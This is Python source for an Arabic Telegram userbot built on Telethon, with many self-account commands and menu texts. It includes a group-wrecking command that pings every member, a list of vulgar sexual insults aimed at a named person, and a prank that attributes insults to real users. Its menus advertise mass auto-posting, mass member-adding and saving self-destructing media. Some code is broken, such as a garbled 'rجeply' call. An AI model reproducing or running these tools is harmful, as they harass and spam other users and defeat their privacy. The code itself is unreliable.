@client.on(events.NewMessage(pattern="تفليش(?:\s|$)([\s\S]*)"))
async def kickall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await edit_or_reply(event, "** ⎙︙ هذا الامر يستعمل للقنوات والمجموعات فقط !**")
    msg = "تحذير: هذا الكروب أو القناة سيتم تفليشه!"
    async for usr in client.iter_participants(chat_id):
        userb = usr.username
        usrtxt = f"{msg} @{userb}"
        if str(userb) == "None":
            userb = usr.id
            usrtxt = f"{msg} {userb}"
        await client.send_message(chat_id, usrtxt)
        await asyncio.sleep(1)
    await event.delete()                                                                          

Z = ["انيك شادو المعرص", "كسمه شادو", "انيك امك ي شادو", "امك قحبه ي شادو"]

@client.on(events.NewMessage(pattern=".شادو$"))
async def ithker(knopis):
    await knopis.edit(random.choice(Z))

@client.on(events.NewMessage(pattern=".رفع مالك(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- لكك دي هذا المطور**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**⎙︙ الحلو** 「[{JoKeRUB}](tg://user?id={user.id})」 \n**⎙︙ تـم رفعه مالك الكروب بواسطة :** {my_mention}")

rehu = [
    "شكم مره كتلك خلي نفلش الكروب",
    "باع هذا اللوكي شديسوي",
    "** مالك الكروب واحد زباله ويدور بنات **",
    "**اول مره اشوف بنات يدورن ولد 😂 **",
    "**شوف هذا الكرنج دين مضال براسه**",
    "**انته واحد فرخ وتنيج**",
    "** راح اعترفلك بشي طلعت احب اختك 🥺 **",
    "**مالك الكروب والمشرفين وفرده من قندرتك ضلعي**",
    "**هذا واحد غثيث وكلب ابن كلب**",
    "**لتحجي كدامه هذا نغل يوصل حجي**",
    "**هذا المالك واحد ساقط وقرام ويدور حلوين**",
    "**لو ربك يجي ماتنكشف الهمسه 😂😂**",
]

aljoker_enabled = True
hussein_enabled = True

async def get_user_from_event(event):
    if event.sender_id in (1087968824, 1036953733, 1062351279, 1067578920, 1067564781):
        return None
    if event.is_private:
        return await event.get_sender()
    if event.is_group:
        return await event.get_chat()
    return None

@client.on(events.NewMessage(pattern="همسه(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await get_user_from_event(event)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    lMl10l = random.choice(rehu)
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**᯽︙الهمسة من المستخدم [{JoKeRUB}](tg://user?id={user.id}) تم كشفها بنجاح ✓**\n**᯽︙ الهمسة هي : {lMl10l} ** ")

@client.on(events.NewMessage(pattern="mark_as_read"))
async def mark_as_read(event):
    if aljoker_enabled:
        await event.mark_read()

@client.on(events.NewMessage(pattern="Hussein"))
async def Hussein(event):
    if hussein_enabled:
        await event.reply("Hussein")
var = {}

async def edit_delete(event, text):
    await event.edit(text)
    await asyncio.sleep(5)
    await event.delete()

@client.on(events.NewMessage(pattern="(خط الغامق|خط غامق|خط المشطوب|خط مشطوب|خط رمز|خط الرمز|خط البايثون|خط بايثون)"))
async def change_font(event):
    font_types = {
        "خط الغامق": "bold",
        "خط مشطوب": "tshwesh",
        "خط رمز": "ramz",
        "خط بايثون": "joker"
    }
    font_type = font_types.get(event.pattern_match.group(1))
    if font_type:
        if var.get(font_type, None) == "on":
            var.pop(font_type)  # تصحيح الخطأ هنا
            await edit_delete(event, f"**᯽︙ تم اطفاء {event.pattern_match.group(1)} بنجاح ✓ **")
        else:
            var[font_type] = "on"
            await edit_delete(event, f"**᯽︙ تم تفعيل {event.pattern_match.group(1)} بنجاح ✓**")

@client.on(events.NewMessage(outgoing=True))
async def reda(event):
    if event.message.text and not event.message.media and event.message.text.count(".") != 1 and event.message.text.count("@") != 1:
        font_types = {
            "bold": "**{}**",
            "tshwesh": "~~{}~~",
            "ramz": "`{}`",
            "joker": "```{}```",
  }
        for font_type, font_format in font_types.items():
            if var.get(font_type, None) == "on":
                try:
                    await event.edit(font_format.format(event.message.text))
                except MessageIdInvalidError:
                    pass
        
@client.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف المترجم$"))
async def stop_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        del tr_status[chat_id]
    await event.edit("**تم إيقاف المترجم.**", parse_mode="md")


@client.on(events.NewMessage(outgoing=True, pattern='\.يوت (.+)'))
async def tconv(event):
    chat = await event.get_chat()
    sentence_to_summarize = event.pattern_match.group(1)
    if sentence_to_summarize.startswith("."):
        sentence_to_summarize = sentence_to_summarize[1:].strip()
    sentence_to_summarize = "يوت " + sentence_to_summarize
    await event.edit("يرجى الانتظار...")
    try:
        x = await client.send_message('@x_h_9bot', sentence_to_summarize)
        async with client.conversation('@x_h_9bot') as conv:
            audio_clip = None
            timeout = 15
            start_time = asyncio.get_event_loop().time()
            while asyncio.get_event_loop().time() - start_time < timeout:
                response = await conv.get_response(x.id)
                await client.send_read_acknowledge(conv.chat_id)
                if "عليك الأشتراك في قناة البوت" in response.message:
                    try:
                        channel_name = re.search(r"قناة البوت : (@\w+)", response.message).group(1)
                        await client(JoinChannelRequest(channel_name))
                        x = await client.send_message('@x_h_9bot', sentence_to_summarize)
                    except Exception as e:
                        print(f"خطأ: {e}")
                if response.audio:
                    audio_clip = response
                    break
            if audio_clip:
                new_message = Message(
                    id=0,
                    peer_id=chat,
                    message="",
                    media=audio_clip.media,
                    entities=None,
                    reply_markup=None,
                    ttl_period=None
                )
                await client.send_message(chat, new_message, silent=True)
                await event.delete()
                await asyncio.sleep(0)  # الانتظار لمدة 60 ثانية
                try:
                    await client(DeleteHistoryRequest(peer='@x_h_9bot', max_id=x.id, just_clear=False, revoke=True))
                except MessageIdInvalidError:
                    print("خطأ: لا يمكن حذف الرسالة")
            else:
                await event.edit("المحتوى غير موجود")
    except Exception as e:
        print(f"خطأ: {e}")
        await event.edit("خطأ في العملية")

@client.on(events.NewMessage(outgoing=True, pattern='\.سوال (.*)'))
async def tco(event):
    chat = await event.get_chat()
    question = event.pattern_match.group(1)
    await event.edit("جارٍ جمع المعلومات انتظر 7 ثوان ...")

    async with client.conversation('@SAMI_PAI_BOT') as conv:
        await conv.send_message(question)

        await asyncio.sleep(7)

        # الحصول على ردين من البوت
        response1 = await conv.get_response()
        response2 = await conv.get_response()

        
        if response1.text == "⌛️ Forming a response ...":
            xx = response2  # استخدام الرسالة الثانية 
        else:
            xx = response1  # استخدام الرسالة الأولى

        text_without_links = re.sub(r'http\S+', '', xx.text)

        await client.send_read_acknowledge(conv.chat_id)
        await client.send_message(chat, text_without_links)
        await event.message.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'\.حمل (.+)'))
async def download_media(event):
    chat = await event.get_chat()
    link = event.pattern_match.group(1)
    message_to_delete = await event.edit("جاري التحميل...")

    async with client.conversation('@aaazzjbot') as conv:
        try:
            await conv.send_message(link)

            @client.on(events.NewMessage(from_users='@aaazzjbot'))
            async def handle_response(event):
                if event.media:
                    if event.grouped_id:
                        for photo in event.media.photos:
                            await client.send_file(chat, photo)
                    else:
                        await client.send_file(chat, event.media)

                    # حذف رسالة "جاري التحميل..."
                    await message_to_delete.delete()

                    # انتظار 3 ثواني قبل حذف المحادثة
                    await asyncio.sleep(3)

                    try:
                        await client(functions.messages.DeleteHistoryRequest(
                            peer='@aaazzjbot',
                            max_id=event.message.id,
                            revoke=True
                        ))
                    except Exception as e:
                        print(f"حدث خطأ: {e}")

                client.remove_event_handler(handle_response)

            try:
                await asyncio.wait_for(
                    client.loop.create_task(conv.get_response()),
                    timeout=10
                )
            except asyncio.TimeoutError:
                await event.edit("اسف ياصديقي لم اجد شيئا")
                client.remove_event_handler(handle_response)

        except Exception as e:
            print(f"حدث خطأ: {e}")
            await event.edit(f"حدث خطأ: {e}")

afk_mode = False   
custom_reply = "أنا لست موجودًا الآن، أرجوك اترك رسالتك وانتظر لحين عودتي."
reply_to_message = None
custom_replies = {}  
custom_replies_enabled = False  
allowed_chats = set()

try:
    with open('custom_replies.pickle', 'rb') as f:
        custom_replies = pickle.load(f)
except FileNotFoundError:
    pass

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.تشغيل الرد$'))
async def enable_afk(event):
    global afk_mode
    afk_mode = True
    await event.edit("تم تشغيل الرد التلقائي.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.المخصص تشغيل$'))
async def enable_custom_replies(event):
    global custom_replies_enabled
    custom_replies_enabled = True
    await event.edit("تم تشغيل الردود المخصصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.تعطيل الرد$'))
async def disable_replies(event):
    global afk_mode, custom_replies_enabled
    afk_mode = False
    custom_replies_enabled = False
    await event.edit("تم تعطيل الرد التلقائي والردود المخصصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.كليشة الرد$'))
async def set_reply_template(event):
    global reply_to_message
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        await event.edit(f"تم تعيين كليشة الرد إلى الرسالة المحددة.")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد استخدامها ككليشة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.رد (.*)'))
async def add_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        reply_text = event.pattern_match.group(1).strip()
        if len(custom_replies) < 20:
            custom_replies[trigger_text] = reply_text
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit(f"تم إضافة الرد المخصص بنجاح. لديك الآن {len(custom_replies)} ردود مخصصة.")
        else:
            await event.edit("لقد وصلت إلى الحد الأقصى للردود المخصصة (20).")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد إضافة رد مخصص لها.")
    await asyncio.sleep(2)
    await event.delete()

@events.register(events.NewMessage(outgoing=True, pattern=r'^\.حذف رد$'))
async def delete_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        if trigger_text in custom_replies:
            del custom_replies[trigger_text]
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit("تم حذف الرد المخصص بنجاح.")
        else:
            await event.edit("لم يتم العثور على رد مخصص لهذه الرسالة.")
    else:
        await event.edit("يرجى الرد على الرسالة التي تريد حذف ردها المخصص.")
    await asyncio.sleep(2)
    await event.delete()

@events.register(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled
    if (afk_mode or custom_replies_enabled) and event.is_private:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:  
                        await event.reply(reply)
                        break  
            if afk_mode:  
                if not event.raw_text in custom_replies:  
                    if reply_to_message:
                        await event.reply(reply_to_message)
                    else:
                        await event.reply(custom_reply)

@events.register(events.NewMessage(outgoing=True, pattern=r'^\.قبول$'))
async def allow_chat(event):
    if event.is_private:
        allowed_chats.add(event.chat_id)
        await event.edit("تم السماح لهذه المحادثة.")
    else:
        await event.edit("لا يمكن استخدام هذا الأمر إلا في المحادثات الخاصة.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.الغاء السماح$'))
async def disallow_chat(event):
    if event.is_private:
        allowed_chats.discard(event.chat_id)
        await event.edit("تم إلغاء السماح لهذه المحادثة.")
    else:
        await event.edit("لا يمكن استخدام هذا الأمر إلا في المحادثات الخاصة.")
    await asyncio.sleep(2)
    await event.delete()



last_reply_sent = None

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled, last_reply_sent
    if (afk_mode or custom_replies_enabled) and event.is_private and event.chat_id not in allowed_chats:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:
                        await event.reply(reply)
                        break
            if afk_mode:
                if not event.raw_text in custom_replies:
                    if reply_to_message:
                        reply_text = reply_to_message.text
                        reply = await event.rجeply(reply_to_message)
                        if last_reply_sent and last_reply_sent.text == reply_text:
                            await last_reply_sent.delete()
                        last_reply_sent = reply
                    else:
                        reply = await event.reply(custom_reply)
                        if last_reply_sent and last_reply_sent.text == custom_reply:
                            await last_reply_sent.delete()
                        last_reply_sent = reply

STAT_INDICATION = f"**⎉╎جـارِ جـلب الاحصـائيـات إنتظـر ⅏ . . .**"
CHANNELS_STR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات** 𓆪\n\n"
CHANNELS_ADMINSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات اشـراف** 𓆪\n\n"
CHANNELS_OWNERSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع القنـوات ملكيـة** 𓆪\n\n"
GROUPS_STR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات** 𓆪\n\n"
GROUPS_ADMINSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات اشـراف** 𓆪\n\n"
GROUPS_OWNERSTR = f"𓆩 **[TNT Multi HUNTER](t.me/S21S6)** **- 🝢 - احصـائيـات جميـع المجمـوعـات ملكيـة** 𓆪\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r"\.احصائياتي"))
async def count(event):
    start_time = time.time()
    u = 0
    g = 0
    c = 0
    bc = 0
    b = 0
    result = ""
    await event.edit("**⪼ جاري المعـالجه ༗.**")
    dialogs = await client.get_dialogs(limit=None, ignore_migrated=True)
    for d in dialogs:
        current_entity = d.entity
        if isinstance(current_entity, User):
            if current_entity.bot:
                b += 1
            else:
                u += 1
        elif isinstance(current_entity, Chat):
            g += 1
        elif isinstance(current_entity, Channel):
            if current_entity.broadcast:
                bc += 1
            else:
                c += 1
        else:
            print(d)
    result += f"ـ𓆩 𝙎𝙊𝙐𝙍𝘾𝞝 𝗘𝗩𝗘 **- 🝢 - احصـائيـات الحسـاب** 𓆪\n"
    result += f"𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻\n"
    result += f"**⎉╎المستخدمون :**\t**{u}**\n"
    result += f"**⎉╎المجموعات :**\t**{g}**\n"
    result += f"**⎉╎المجموعات الخارقه :**\t**{c}**\n"
    result += f"**⎉╎القنوات :**\t**{bc}**\n"
    result += f"**⎉╎البوتات :**\t**{b}**\n"
    result += f"ـ𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻"
    stop_time = time.time() - start_time
    result += f"\n**- الوقـت المستغـرق 📟 :** {stop_time:.02f} **ثـانيـه**"
    await event.edit(result)
   

@client.on(events.NewMessage(outgoing=True, pattern=r"\.معلوماتي"))
async def stats(event):
    "To get statistics of your telegram account."
    cat = await event.edit("**⪼ جاري المعـالجه ༗.**...")
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0

    def inline_mention(user):
        return f"[{user.first_name}](tg://user?id={user.id})"

    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (isinstance(entity, Channel) and entity.megagroup or
              not isinstance(entity, Channel) and not isinstance(entity, User) and isinstance(entity, Chat)):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count

    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"ـ𓆩 𝙎𝙊𝙐𝙍𝘾𝞝 TNT **- 🝢 - معلومات {full_name}** 𓆪\n"
    response += f"**ـ𓍹ⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧⵧ𓍻**\n"
    response += f"**- الخـاص :** {private_chats} \n"
    response += f" ★ **اشخـاص :** `{private_chats - bots}` \n"
    response += f" ★ **بـوتـات :** `{bots}` \n"
    response += f"**- المجمـوعـات :** {groups} \n"
    response += f"**- القنـوات :** {broadcast_channels} \n"
    response += f"**- ادمـن في مجموعات :** {admin_in_groups} \n"
    response += f" ★ **مـالك :** `{creator_in_groups}` \n"
    response += f" ★ **ادمـن : ** `{admin_in_groups - creator_in_groups}` \n"
    response += f"**- ادمـن في قنـوات :** {admin_in_broadcast_channels} \n"
    response += f" ★ **مـالك :** `{creator_in_channels}` \n"
    response += (f" ★ **ادمـن :** `{admin_in_broadcast_channels - creator_in_channels}` \n")
    response += f"**ـUnread:** {unread} \n"
    response += f"**ـUnread Mentions:** {unread_mentions} \n\n"
    response += f"📌**- الوقـت المستغـرق 📟 :** {stop_time:.02f} **ثـانيـه**"
    await cat.edit(response)

PICS_STR = []

@client.on(events.NewMessage(pattern=r"لوجو ?(.*)"))
async def lg1(userevent):
    event = await eor(userevent, "- جـارِ صنـع لـوقـو عـربـي بحقـوقك ...")
    text = userevent.pattern_match.group(1)
    if not text:
        await eor(userevent, "- الامـر + نص او الامـر + نص بالـرد ع صـورة ...")
        return
        
    arabic_text = "".join(char for char in text if char.isalpha() and char not in string.ascii_letters)
    if not arabic_text:
        await eor(userevent, "- الرجاء إدخال نص باللغـة العربيـة فقـط.\n.لوقو + نص عـربـي\n.لوكو + نص انكـلش")
        return
        
    if len(text) <= 8:
        font_size_ = 150
        strik = 10
    elif len(text) >= 9:
        font_size_ = 50
        strik = 5
    else:
        font_size_ = 130
        strik = 20
        
    if userevent.reply_to_msg_id:
        rply = await userevent.get_reply_message()
        logo_ = await userevent.client.download_media(rply)
    else:
        async for i in client.iter_messages("@Z_44_Z", filter=InputMessagesFilterPhotos):
            PICS_STR.append(i)
        pic = random.choice(PICS_STR)
        logo_ = await pic.download_media()
        
    img = Image.open(logo_)
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("font.ttf", font_size_)
    image_widthz, image_heightz = img.size
    w = font.getsize(text)[0]
    h = font.getsize(text)[1]
    image_width, image_height = img.size
    draw.text(((image_width - w) / 2, (image_height - h) / 2), text, font=font, fill=(255, 255, 255), )
    w_ = (image_width - w) / 2
    h_ = (image_height - h) / 2
    draw.text((w_, h_), text, font=font, fill="white", stroke_width=strik, stroke_fill="black")
    
    file_name = "Andencento.png"
    img.save(file_name, "PNG")
    await userevent.client.send_file(userevent.chat_id, file_name)
    await userevent.delete()
    try:
        os.remove(file_name)
        os.remove(logo_)
    except BaseException:
        pass


        
@client.on(events.NewMessage(from_users='me', pattern='.الاوامر'))
async def show_commands(event):
    await event.delete()
    commands_text = """	
⋆ـ┄──┄─[ 𝗘𝗩𝗔 𝗦𝗢𝗨𝗥𝗖𝗘 ](t.me/S21S6)┄─┄─┄┄ـ
 `.م1`➪  اوامــر الــخــاص
 `.م2`➪  اوامــر الــردود
 `.م3`➪  اوامــر نــشــر الــتـلـقـائـي
 `.م4`➪  اوامــر الــحــســاب
 `.م5`➪  اوامــر الــتــسـلـيــة
 `.م6`➪  اوامــر وعــد
 `.م7`➪  اوامــر الــيــوتــيــوب 
 `.م8`➪ اوامــر الــمــجــمــوعـات
 `.م9`➪ اوامـر تجــمــيــع تـلـقـائـي 
 `.م10`➪ اوامــر الـخطـوط والترجمة 
 `.م11`➪ اوامر التنصيب الخارجي 
 `.م12`➪ اوامــر الــمــغـادرات
 `.م13`➪ اوامــر الـذاتيــة
 `.م14`➪ اوامــر الاضـافـة
 `.م15`➪ اوامــر الـتـحـويـل
 `.م16`➪ اوامــر اخـرى
 `.م17`➪ اوامــر الـذكــاء الاصـطـنـاعـي
 `.م18`➪ اوامــر عرض القنوات 
 `.م19`➪ اوامــر الـلـعـاب
 `.م20`➪ اوامــر اضـافـيـة
 `.م21`➪ اوامــر 2 الـتـسـلـيـه
 `.م22`➪ اوامــر الـمـيـمـز
 `.م23`➪ اوامــر الـتـقـلـيـد والـنـتـحـال
  `.م24`➪ اوامــر الـتـحــشــيــش
"""
    await event.reply(commands_text)

@client.on(events.NewMessage(from_users='me', pattern='.م1'))
async def show_m1_commands(event):
    await event.delete()
    m1_text = """
<━━━[★] اوامر الخاص [★]━━━>

 • `.كتم`

 • `.سماح`

 • `.المكتومين`

 • `.اضافة قناة اشتراك (رابط القناة)`

 • `مسح القناة`
"""
    await event.reply(m1_text)

@client.on(events.NewMessage(from_users='me', pattern='.م2'))
async def show_m2_commands(event):
    await event.delete()
    m2_text = """
<━━━[★] اوامر الردود [★]━━━>
 • `.add (الكلمة المفتاحية) الرد`
 • مثال لاضافه الرد الخاص مع الصوره

 • `.الكلمة المفتاحية`

 • `.الردود`

 • `.رد (النص)`
 • مثال لتعين الرد التلقائي للخاص
"""
    await event.reply(m2_text)

@client.on(events.NewMessage(from_users='me', pattern='.م3'))
async def show_m3_commands(event):
    await event.delete()
    m3_text = """
<━━━[★] النشر التلقائي  [★]━━━>
 • `.تك`  (عدد الثواني) (عدد مرات النشر) الرسالة'

 • `.تكرار`  (عدد الثواني) (عدد مرات النشر) الرسالة'

 •  `.نشر` (عدد الثواني) (عدد مرات النشر) الرسالة'

 • `.ايقاف النشر التلقائي` 

 • `.نشر مجموعات (عدد المجموعات)` الرسالة

 •  `.خاص ` اذاعة للخاص

 •  `سوبر` عدد الثواني :
- للنشر بكافة المجموعات السوبر التي منظم اليها 

 •  `تناوب` عدد الثواني : 
- للنشر في جميع المجموعات بالتناوب وحسب الوقت المحدد 

 •  `.بلش` +ثواني : لتكرار الرسالة
مثال روح الكروب الي تريد تنشر بيه واكتب هاي

"""
    await event.reply(m3_text)

@client.on(events.NewMessage(from_users='me', pattern='.م4'))
async def show_m4_commands(event):
    await event.delete()
    m4_text = """
<━━━[★] اوامر الاسم الوقتي [★]━━━>
 • `.تفعيل الاسم الوقتي` / `.تعطيل الاسم الوقتي`
▪︎ يقوم بتفعيل وقت يم اسمك 

 • `.عداد (عدد الدقائق)`
▪︎ يقوم بإنشاء عداد

 • `.توقيف`
▪︎ يقوم بتوقيف العداد

 • `.الاسم (الاسم الجديد)`
▪︎ يقوم بتغير اسمك دون حاجه للتعب 

 • `.مسح (عدد الرسائل)`
▪︎ يقوم بمسح رسائلك 

 • `.احصائياتي`
▪︎ يقوم بعرض عدد قنواتك وعدد كروباتك

 • `.معلوماتي` 
▪︎ يقوم بعرض جميع قنواتك وكروبات وعدد الخاص
"""
    await event.reply(m4_text)

@client.on(events.NewMessage(from_users='me', pattern='.م5'))
async def show_m5_commands(event):
    await event.delete()
    m5_text = """
╮•❐ اوامـر التسليـه والكاريكتـر  ⦂ 
 • `.متت` ☭ • `.انتحار`و☭ • `.شرير` ☭ • `.غبي` ☭ • `.ترحيب` ☭ • `.وحش` ☭ • `.قاتل`☭ • `.مسدس` ☭ • `.كلب` ☭ • `.هلو`☭ • `.ثعبان` ☭ • `.دس لايك` ☭ • `.اشارة` ☭ • `.شرطة` ☭ • `.احم` • `.احبك` • `.ثلج` • `.السورس` • `.حب` • `.سبونج بوب` • `.طائره` • `.صدمه` • `.نادم`  • `.قنبلة`  

"""
    await event.reply(m5_text)

@client.on(events.NewMessage(from_users='me', pattern='.م6'))
async def show_m6_commands(event):
    await event.delete()
    m6_text = """
<━━━[★] اوامر بوت وعد [★]━━━>
 • `.راتب`

 • `.ايقاف راتب`

 • `.بخشيش`

 • `.ايقاف بخشيش`

 • `.سرقة (ايدي شخص)`

 • `.ايقاف سرقة`

"""
    await event.reply(m6_text)

@client.on(events.NewMessage(from_users='me', pattern='.م7'))
async def show_m7_commands(event):
    await event.delete()
    m7_text = """
<━━━[★] اوامر تحميل [★]━━━>
 • `.يوتيوب (عنوان الفيديو)`

ملاحظة : اجعل قبل كل امر نقطة ❲.❳
"""
    await event.reply(m7_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.م8'))
async def show_m8_commands(event):
    await event.delete()
    m8_text = """
<━━━[★] اوامر المجموعه [★]━━━>

 • `.تقييد | بالرد`

 • `.الغاء تقييد | بالرد`

 • `.المقيدين`
 
 • `.كشف المجموعة`

"""
    await event.reply(m8_text)

@client.on(events.NewMessage(from_users='me', pattern='.م9'))
async def show_m9_commands(event):
    await event.delete()
    m9_text = """
<━━━[★] اوامر التجميع [★]━━━>
• `.تجميع المليار`
• `.تجميع الجوكر`
• `.تجميع العقاب`
• `.تجميع العقرب`
• `.تجميع العرب`
• `.تجميع دعمكم`
• `.تجميع كرستيانو`
• `.تجميع مهدويون`
• `.تجميع اساسيل`

• .ايقاف التجميع  - لايقاف حالة التجميع 
```مـلاحظة : يجب الاشتراك في قنوات البوت الاجبارية قبل بدء التجميع . ```
"""    
    await event.reply(m9_text)

@client.on(events.NewMessage(from_users='me', pattern='.م10'))
async def show_m10_commands(event):
    await event.delete()
    m10_text = """
<━━━[★] اوامر الخطوط [★]━━━>

1- `خط غامق`  2- `خط مشطوب`

3- `خط رمز`  4- `خط بايثون`

5- `.طباعة` + الكلمة او الجملة المراد ارسالها

جميع الخطوط اعلاه تتوقف بكتابة نفس امر التشغيل 

<━━━[★] اوامر الترجمـة [★]━━━>

▪︎`.مترجم` + رمز اللغة | مثال .مترجم ar

يقوم هذا الامر بعد تفعيله بتحويل اي جمله الى اللغة المحدده

▪︎`.ايقاف المترجم` لايقاف الخدمة
"""
    await event.reply(m10_text)

@client.on(events.NewMessage(from_users='me', pattern='.م11'))
async def show_m11_commands(event):
    await event.delete()
    m11_text = """
<━━━[★] اوامر التنصيب [★]━━━>

▪︎ `.جلسة <رقم الهاتف>`: يجب كتابة رقم الهاتف مع رمز الدولة (مثال: +964770000.). 


▪︎ `.رمز <الكود>`: ضع مسافة بين الارقام  (مثال: .رمز 1 2 3 4 ).


▪︎ `.تحقق <كلمة المرور>`:  باسوورد التحقق بخطوتين. (مثال : .تحقق gggg)

▪︎||مـلاحظة لايمكنك التنصيب لاشخاص اخرين الا اذا كنت المالك الحقيقي للسيرفر. 
"""
    await event.reply(m11_text)


@client.on(events.NewMessage(from_users='me', pattern='.م12'))
async def show_m12_commands(event):
    await event.delete()
    m12_text = """
<━━━[★] اوامر المغادرة [★]━━━>
▪︎ `.مغادرة القنوات'`
لمغادرة جميع القنوات التي تمتلكها باستثناء القنوات التي انت مالكها او مشرف فيها 

▪︎ `.مغادرة الكروبات`
لمغادرة جميع المجموعات باستثناء المجموعات التي انت مالكها او مشرف فيها 
"""
    await event.reply(m12_text)

@client.on(events.NewMessage(from_users='me', pattern='.م13'))
async def show_m13_commands(event):
    await event.delete()
    m13_text = """
<━━━[★] اوامر الذاتيه [★]━━━>
        `.ذاتية`
▪︎ يستخدم لحفظ الصور والفيديوهات المؤقتة (بالرد على الصورة).

        `.حفظ الذاتية`
▪︎ سيقوم هذا الامر بعد تفعيلة بحفظ الصور والفيديوهات المؤقته تلقائيا .
"""    
    await event.reply(m13_text)

@client.on(events.NewMessage(from_users='me', pattern='.م14'))
async def show_m14_commands(event):
    await event.delete()
    m14_text = """
<━━━[★] اوامر الاظافة [★]━━━>
        `.ضيف`
▪︎ يقوم بإضافه الاعضاء الي كروبك او قناتك 

        `اضافة_جهاتي`
▪︎ يقوم بإضافة جهات الاتصال الخاصه بك وبسرعه فايقه

``` تنبيه لا تلح بل الامر كثر راح تنحظر ```
"""
    await event.reply(m14_text)

@client.on(events.NewMessage(from_users='me', pattern='.م15'))
async def show_m15_commands(event):
    await event.delete()
    m15_text = """
<━━━[★] اوامر التحويل [★]━━━>
        `.تحويل نص `
	يقوم بتحويل النص الي ملصق
"""    
    await event.reply(m15_text)

@client.on(events.NewMessage(from_users='me', pattern='.م16'))
async def show_m16_commands(event):
    await event.delete()
    m16_text = """
<━━━[★] اوامر أخرى [★]━━━>
▪︎ `.تاريخه`
يظهر لك تاريخ أنشأء الحساب

▪︎ `.ايميل وهمي`
يقوم بعمل ايميل وهمي (موقت)

▪︎ `.حالتي`
يقوم بإظهار ان كنت محظور ام لا 

▪︎ `.مود التكبر`
مثال اكتب التكبر : العدد

▪︎ `.مود التكبر تعطيل`
يقوم بتعطيل امر التكبر 

▪︎ `.التكبر تعطيل`
يقوم بتعطيل امر التكبر 

"""
    await event.reply(m16_text)

@client.on(events.NewMessage(from_users='me', pattern='.م17'))
async def show_m17_commands(event):
    await event.delete()
    m17_text = """
<━━━[★] اوامر الذكاء الاصطناعي [★]━━━>
		`.ذكاء`
▪︎ مثال اكتب .ذكاء : السؤال

		`.الذكاء تفعيل`
▪︎ يقوم بتشغيل الذكاء الاصطناعي في حسابك 

		`.الذكاء تعطيل`
▪︎ يقوم بإيقاف الذكاء الاصطناعي في الحساب 
"""    
